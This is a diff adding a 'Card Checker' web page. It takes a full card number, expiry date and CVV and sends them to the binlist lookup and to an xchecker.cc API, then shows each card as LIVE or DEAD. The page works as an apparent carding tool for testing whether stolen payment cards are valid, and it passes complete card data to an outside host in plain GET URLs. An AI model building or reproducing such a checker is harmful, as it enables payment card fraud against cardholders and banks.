@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Card Checker</title>
+        <link rel="stylesheet" type="text/css" href="styles.css">
+            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    </head>
+    <body>
+        <form id="cardForm" netlify-data="true">
+            <h1>Card Checker</h1>
+            
+            <label for="cardNumber">Credit Card Number:</label>
+            <input type="text" id="cardNumber" required>
+                
+                <label for="expirationMonth">Expiration Date:</label>
+                <div class="expiration-container">
+                    <select id="expirationMonth" required>
+                        <option value="">Month</option>
+                        <option value="01">01 - January</option>
+                        <option value="02">02 - February</option>
+                        <option value="03">03 - March</option>
+                        <option value="04">04 - April</option>
+                        <option value="05">05 - May</option>
+                        <option value="06">06 - June</option>
+                        <option value="07">07 - July</option>
+                        <option value="08">08 - August</option>
+                        <option value="09">09 - September</option>
+                        <option value="10">10 - October</option>
+                        <option value="11">11 - November</option>
+                        <option value="12">12 - December</option>
+                    </select>
+                    
+                    <select id="expirationYear" required>
+                        <option value="">Year</option>
+                        <option value="2023">2023</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                    </select>
+                </div>
+                
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" required>
+                    
+                    <button type="submit">Check Card Now</button>
+                    </form>
+        
+        <div id="binlistResultContainer"></div>
+
+        
+        <script>
+            function displayCardInformation(binlistResponse, xcheckerResponse) {
+                var binlistResultContainer = $('#binlistResultContainer');
+                binlistResultContainer.html(""); // Clear previous result
+                
+                // Display binlist result
+                binlistResultContainer.append("<h2>Card Details</h2>");
+                binlistResultContainer.append("<p>Brand: " + binlistResponse.scheme + "</p>");
+                binlistResultContainer.append("<p>Type: " + binlistResponse.type + "</p>");
+                binlistResultContainer.append("<p>Brand: " + binlistResponse.brand + "</p>");
+                binlistResultContainer.append("<p>Prepaid: " + binlistResponse.prepaid + "</p>");
+                binlistResultContainer.append("<p>Country: " + binlistResponse.country.emoji + "</p>");
+                binlistResultContainer.append("<p>Bank Name: " + binlistResponse.bank.name + "</p>");
+                binlistResultContainer.append("<p>Bank URL: " + binlistResponse.bank.url + "</p>");
+                binlistResultContainer.append("<p>Bank Phone: " + binlistResponse.bank.phone + "</p>");
+                binlistResultContainer.append("<p>Bank City: " + binlistResponse.bank.city + "</p>");
+                
+                // Display xchecker result
+                binlistResultContainer.append("<h2>Card Results</h2>");
+                var statusText = "<p>Status: " + xcheckerResponse.status + "</p>";
+                if (xcheckerResponse.status === "LIVE") {
+                    statusText = "<p><span style='font-weight: bold; color: green;'>Status: " + xcheckerResponse.status + "</span></p>";
+                } else if (xcheckerResponse.status === "DEAD") {
+                    statusText = "<p><span style='font-weight: bold; color: red;'>Status: " + xcheckerResponse.status + "</span></p>";
+                }
+                
+                binlistResultContainer.append(statusText);
+                // Display other desired fields from the xchecker response object
+                
+                // You can style the binlist result container as desired using CSS
+
+            }
+        
+        $(document).ready(function () {
+                          $('#cardForm').submit(function (event) {
+                                                event.preventDefault(); // Prevent form submission
+                                                
+                                                var cardNumber = $('#cardNumber').val();
+                                                var expirationMonth = $('#expirationMonth').val();
+                                                var expirationYear = $('#expirationYear').val();
+                                                var cvv = $('#cvv').val();
+                                                
+                                                // Make the API request to lookup.binlist.net for the first 8 digits of the card number
+                                                var binlistSettings = {
+                                                "url": "https://lookup.binlist.net/" + cardNumber.substr(0, 8),
+                                                "method": "GET",
+                                                "timeout": 0
+                                                };
+                                                
+                                                $.ajax(binlistSettings).done(function (binlistResponse) {
+                                                                             // Make the API request to www.xchecker.cc for card validation
+                                                                             var xcheckerSettings = {
+                                                                             "url": "https://www.xchecker.cc/api.php?cc=" + cardNumber + "|" + expirationMonth + "|" + expirationYear.slice(-2) + "|" + cvv,
+                                                                             "method": "GET",
+                                                                             "timeout": 0
+                                                                             };
+                                                                             
+                                                                             $.ajax(xcheckerSettings).done(function (xcheckerResponse) {
+                                                                                                           displayCardInformation(binlistResponse, xcheckerResponse);
+                                                                                                           });
+                                                                             });
+                                                });
+                          });
+
+                              </script>
+
+    </body>
+</html>
+
